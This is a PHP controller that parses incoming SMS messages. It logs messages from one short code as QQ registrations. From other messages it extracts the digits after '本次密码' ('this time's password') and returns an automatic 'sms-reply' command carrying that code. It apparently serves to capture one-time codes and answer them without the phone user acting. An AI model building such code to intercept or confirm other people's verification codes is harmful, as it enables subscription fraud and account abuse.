<?php
/**
 * @author Hike
 *
 */
class ParserController extends Wavegoing_Action{
    public function smsAction(){
        $spNumber=$this->getRequest()->getParam("x");
        $content=$this->getRequest()->getParam('y');
        if($this->isQQRegister($spNumber,$content)){
            $this->parseQQRegister($spNumber,$content);
        }else{
            $this->parseSmsBusiness($spNumber,$content);
        }
    }
    private function isQQRegister($spNumber,$content){
        return $spNumber=='1069070059';
    }
    private function parseQQRegister($spNumber,$content){
        $this->logJsonResult("QQRegister:$spNumber,$content");
        $this->view->result="";
    }
    private function parseSmsBusiness($spNumber,$data){
        $parseResult=$this->parseFormat2($data);
        $result="";
        if(strlen($parseResult)>0){
            $result="`sms-reply`,$spNumber,$parseResult";
        }
        $this->logJsonResult($result);
        $this->view->result=$result;
    }
    
    /**
	 * @param string $data
	 * @return string
	 */
    private function parseFormat2($data){
        $keyword='本次密码';
        $pos=strpos($data,$keyword)+strlen($keyword);
        $result="";
        $char=substr($data,$pos,1);
        while($char>='0'&&$char<='9'&&$pos<strlen($data)){
            $result=$result.$char;
            $pos=$pos+1;
            $char=substr($data,$pos,1);
        }
        return $result;
    }
    
    /**
	 * @deprecated
	 * @param string $data
	 * @return string|NULL
	 */
    private function parseFormat1($data){
        $result=$this->findInclude($data,'本次密码','，');
        if($result==null){
            $result=$this->findInclude($data,'本次密码','。');
        }
        if($result==null){
            $result=$this->findInclude($data,"&#26412;&#27425;&#23494;&#30721;","&#65292;");
        }
        if($result==null) $result="";
        return $result;
    }
    private function findInclude($data,$keyword,$keyword2){
        $result=null;
        $startIndex=strpos($data,$keyword);
        if($startIndex>0){
            $endIndex=stripos($data,$keyword2,$startIndex+1);
            if($endIndex>$startIndex){
                $startIndex=$startIndex+strlen($keyword);
                $result=substr($data,$startIndex,$endIndex-$startIndex);
            }
        }
        return $result;
    }
}



